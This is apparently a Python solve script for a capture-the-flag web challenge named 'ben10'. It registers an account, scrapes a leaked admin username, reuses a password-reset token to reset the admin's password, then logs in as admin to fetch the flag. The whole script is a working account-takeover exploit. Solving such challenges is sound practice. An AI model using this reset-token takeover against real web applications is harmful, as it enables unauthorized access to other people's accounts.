import requests
from bs4 import BeautifulSoup


#url="http://127.0.0.1:1337"
url="http://ben10.challs.srdnlen.it:8080"

username="xnw"
password="password"

data = {
	"username": username,
	"password" :password	
}
def register(url):
	url = url+"/register"
	resp = requests.post(url,data=data)
	if "Registration successful" in resp.text:
		print("Registered user")

def login(url, data, get_admin=True):
	s =	requests.Session()
	url = url+"/login"
	resp = s.post(url,data=data)	
	# print(resp.text)
	soup = BeautifulSoup(resp.text, 'html.parser')
	if get_admin:
		return soup.find(id="admin_data").get_text()
	else:
		return s 

# get token  
def reset_password(url,data):
	url=url+"/reset_password"
	resp = requests.post(url, data=data)	
	#print(resp.text)
	soup = BeautifulSoup(resp.text, 'html.parser')
	
	return soup.find('strong').get_text()

def forgot_password(url,admin_username, reset_token):
	url=url+"/forgot_password"
	data = {
		"username":admin_username,
		"reset_token": reset_token,
		"new_password": "password",
		"confirm_password": "password"
	}	
	resp = requests.post(url,data=data)	
	if "Password reset successfully" in resp.text:
		print(f"{admin_username} password reset to password")


def get_flag(s, url):
	url=url+"/image/ben10"
	resp = s.get(url)	
	soup = BeautifulSoup(resp.text, 'html.parser')
	return soup.find(class_="flag-container")

register(url)
print("username:", data['username'])
admin_username = login(url,data)
print("admin_username:", admin_username)
reset_token = reset_password(url,data)

print("reset_token:", reset_token)
forgot_password(url, admin_username,reset_token)

data["username"] = admin_username
s= login(url, data, get_admin=False)
flag = get_flag(s, url)

print(flag)
